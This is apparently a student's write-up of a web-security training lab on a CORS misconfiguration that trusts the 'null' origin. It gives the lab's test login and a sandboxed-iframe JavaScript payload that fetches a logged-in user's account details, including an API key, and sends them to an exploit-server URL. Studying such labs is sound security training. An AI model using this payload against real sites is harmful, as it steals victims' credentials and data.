Lab #2 - CORS vulnerability with trusted null origin

vulnerability - This website has an insecure CORS configuration in that it trusts the "null" origin.

Goal - To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

Credentials - wiener:peter

Analysis:

Solution:
- create an HTML form like below, upload to explot server ==> delivery to victim.
<iframe sandbox="allow-scripts" srcdoc="
    <script>
        fetch('https://0acf002b048f2d0880f1035f007200bc.web-security-academy.net/accountDetails', {
            credentials: 'include'
        })
        .then(r => r.text())
        .then(data => {
            fetch('https://exploit-0a3a00d104712d6180d002db016c00ad.exploit-server.net/log?data=' + data);
        })
        .catch(err => console.error(err));
    </script>
